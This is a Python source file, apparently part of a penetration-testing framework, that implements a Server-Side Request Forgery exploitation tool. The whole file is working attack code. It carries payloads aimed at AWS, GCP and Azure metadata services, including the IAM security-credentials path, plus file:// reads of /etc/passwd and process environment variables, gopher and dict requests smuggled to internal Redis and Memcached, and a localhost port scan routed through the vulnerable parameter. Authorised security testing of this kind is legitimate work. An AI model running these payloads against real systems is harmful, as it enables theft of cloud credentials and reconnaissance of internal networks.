"""
SSRF_EXPLOIT -- Server-Side Request Forgery exploitation.

Goes beyond nuclei detection with:
  1. Internal network probing (10.x, 172.16-31.x, 192.168.x)
  2. Cloud metadata access (AWS, GCP, Azure)
  3. Port scanning via SSRF (internal services)
  4. Protocol smuggling (file://, gopher://, dict://)
  5. DNS rebinding detection
  6. Blind SSRF detection via callback

Pure Python + requests.  Non-destructive: reads metadata, probes services only.
"""

import re

import requests

from tools.attack.verdict import confidence_from_criteria, criteria_label
from tools.base import Tool, ToolResult

# ── Internal network probes ────────────────────────────────────────────────

INTERNAL_PROBES = [
    # Localhost
    ("http://127.0.0.1", "localhost_ipv4"),
    ("http://localhost", "localhost_name"),
    ("http://[::1]", "localhost_ipv6"),
    # Internal networks
    ("http://10.0.0.1", "internal_10"),
    ("http://172.16.0.1", "internal_172"),
    ("http://192.168.1.1", "internal_192"),
    # Cloud metadata (AWS)
    ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws_iam"),
    # Cloud metadata (GCP)
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp_metadata"),
    # Cloud metadata (Azure)
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_metadata"),
]

# ── Protocol smuggling payloads ────────────────────────────────────────────

PROTOCOL_PAYLOADS = [
    ("file:///etc/passwd", "file_protocol"),
    ("file:///proc/self/environ", "file_environ"),
    ("gopher://127.0.0.1:6379/_INFO", "gopher_redis"),
    ("gopher://127.0.0.1:11211/_stats", "gopher_memcached"),
    ("dict://127.0.0.1:6379/INFO", "dict_redis"),
]

# ── Port scan via SSRF ─────────────────────────────────────────────────────

PORT_SCAN_TARGETS = [
    (21, "FTP"),
    (22, "SSH"),
    (25, "SMTP"),
    (53, "DNS"),
    (80, "HTTP"),
    (443, "HTTPS"),
    (3306, "MySQL"),
    (5432, "PostgreSQL"),
    (6379, "Redis"),
    (8080, "HTTP-Alt"),
    (8443, "HTTPS-Alt"),
    (9200, "Elasticsearch"),
    (11211, "Memcached"),
    (27017, "MongoDB"),
]

# ── Cloud metadata paths ───────────────────────────────────────────────────

AWS_METADATA_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/hostname",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/user-data/",
]

# ── Detection patterns ─────────────────────────────────────────────────────

AWS_PATTERNS = [
    re.compile(r"ami-[a-f0-9]+"),
    re.compile(r"instance-id:?\s*i-[a-f0-9]+"),
    re.compile(r"iam.*role", re.IGNORECASE),
]

OPEN_PORT_PATTERNS = [
    re.compile(r"SSH-"),
    re.compile(r"220.*FTP"),
    re.compile(r"\*OK"),
    re.compile(r"Redis"),
    re.compile(r"\+OK"),
]


class SSRFExploitTool(Tool):
    """Server-Side Request Forgery exploitation."""

    name = "ssrf_exploit"
    capability = "SSRF_EXPLOIT"
    binary = ""

    def is_available(self) -> bool:
        return True

    def validate(self):
        return None

    def build_command(self, target: str, **kwargs) -> list:
        return ["python-ssrf-exploit", target]

    def parse(self, stdout: str, stderr: str) -> dict:
        return {}

    def run(self, target: str, timeout: int = 30, **kwargs) -> ToolResult:
        base = kwargs.get("full_url") or (target if target.startswith("http") else f"https://{target}")
        param = kwargs.get("param", "")
        method = kwargs.get("method", "GET").upper()
        headers = kwargs.get("headers", {})
        cookies = kwargs.get("cookies", {})
        endpoint = kwargs.get("endpoint", "")

        test_url = base
        if endpoint:
            test_url = base.rstrip("/") + "/" + endpoint.lstrip("/")

        all_findings = []

        # Phase 1: Cloud metadata access
        for probe_url, probe_label in INTERNAL_PROBES:
            result = self._send_ssrf_payload(test_url, param, probe_url, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                # Check AWS metadata
                if "aws" in probe_label and any(pat.search(body) for pat in AWS_PATTERNS):
                    all_findings.append({
                        "type": "cloud_metadata",
                        "provider": "AWS",
                        "severity": "CRITICAL",
                        "confidence": 95,
                        "url": result["url"],
                        "target": probe_url,
                        "evidence": body[:300],
                        "description": f"SSRF: AWS metadata accessible at {probe_url}",
                    })
                # Check GCP metadata
                elif "gcp" in probe_label and "metadata" in body.lower():
                    all_findings.append({
                        "type": "cloud_metadata",
                        "provider": "GCP",
                        "severity": "CRITICAL",
                        "confidence": 90,
                        "url": result["url"],
                        "target": probe_url,
                        "evidence": body[:300],
                        "description": f"SSRF: GCP metadata accessible at {probe_url}",
                    })
                # Check Azure metadata
                elif "azure" in probe_label and "vmId" in body:
                    all_findings.append({
                        "type": "cloud_metadata",
                        "provider": "Azure",
                        "severity": "CRITICAL",
                        "confidence": 90,
                        "url": result["url"],
                        "target": probe_url,
                        "evidence": body[:300],
                        "description": f"SSRF: Azure metadata accessible at {probe_url}",
                    })
                # Check internal network
                elif "internal" in probe_label and result.get("status") == 200:
                    all_findings.append({
                        "type": "internal_network_access",
                        "severity": "HIGH",
                        "confidence": 75,
                        "url": result["url"],
                        "target": probe_url,
                        "evidence": body[:200],
                        "description": f"SSRF: internal network accessible at {probe_url}",
                    })

        # Phase 2: Protocol smuggling
        for payload, variant in PROTOCOL_PAYLOADS:
            result = self._send_ssrf_payload(test_url, param, payload, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                if "file" in variant and any(pat.search(body) for pat in [
                    re.compile(r"root:.+:0:0:"),
                    re.compile(r"/bin/(ba)?sh"),
                ]):
                    all_findings.append({
                        "type": "protocol_smuggling",
                        "variant": variant,
                        "severity": "CRITICAL",
                        "confidence": 95,
                        "url": result["url"],
                        "payload": payload,
                        "evidence": body[:300],
                        "description": f"SSRF: file protocol reads /etc/passwd via {variant}",
                    })
                elif "gopher" in variant and len(body) > 10:
                    met = ["gopher_data_received"]
                    all_findings.append({
                        "type": "protocol_smuggling",
                        "variant": variant,
                        "severity": "HIGH",
                        "confidence": confidence_from_criteria(
                            met, {"gopher_data_received": 30}),
                        "proof_criteria": met + [{"note": "data returned over gopher dialect"}],
                        "url": result["url"],
                        "payload": payload,
                        "evidence": body[:200],
                        "description": f"SSRF: gopher protocol reached internal service via {variant}",
                    })

        # Phase 3: Internal port scan
        port_results = self._port_scan_via_ssrf(test_url, param, method, headers, cookies, timeout)
        for port_info in port_results:
            all_findings.append({
                "type": "internal_port_scan",
                "severity": "MEDIUM",
                "confidence": port_info["confidence"],
                "url": base,
                "evidence": port_info["evidence"],
                "description": f"SSRF: internal port {port_info['port']} ({port_info['service']}) accessible",
                "port": port_info["port"],
                "service": port_info["service"],
            })

        return ToolResult(tool=self.name, status="success", capability=self.capability,
                          results={"ssrf_findings": all_findings, "count": len(all_findings)})

    @staticmethod
    def _send_ssrf_payload(base, param, payload, method, headers, cookies, timeout):
        """Send an SSRF payload via the specified parameter."""
        try:
            if method == "GET":
                sep = "&" if "?" in base else "?"
                url = f"{base}{sep}{param}={requests.utils.quote(payload)}" if param else base
                r = requests.get(url, timeout=timeout, headers=headers,
                                 cookies=cookies, allow_redirects=False)
            else:
                url = base
                data = {param: payload} if param else {"url": payload}
                r = requests.post(url, timeout=timeout, headers=headers,
                                  cookies=cookies, data=data, allow_redirects=False)

            return {"url": url, "status": r.status_code, "body": r.text[:15000]}
        except requests.RequestException:
            return None

    def _port_scan_via_ssrf(self, base, param, method, headers, cookies, timeout):
        """Scan internal ports via SSRF by observing response differences."""
        open_ports = []
        for port, service in PORT_SCAN_TARGETS[:8]:
            probe_url = f"http://127.0.0.1:{port}/"
            result = self._send_ssrf_payload(base, param, probe_url, method, headers, cookies, timeout)
            if result:
                body = result.get("body", "")
                status = result.get("status", 0)
                # Different response than closed port = likely open
                if status not in (0, 500, 502, 503) and len(body) > 0:
                    confidence = 60
                    for pat in OPEN_PORT_PATTERNS:
                        if pat.search(body):
                            confidence = 85
                            break
                    open_ports.append({
                        "port": port,
                        "service": service,
                        "confidence": confidence,
                        "evidence": f"HTTP {status}, {len(body)} bytes response",
                    })
        return open_ports
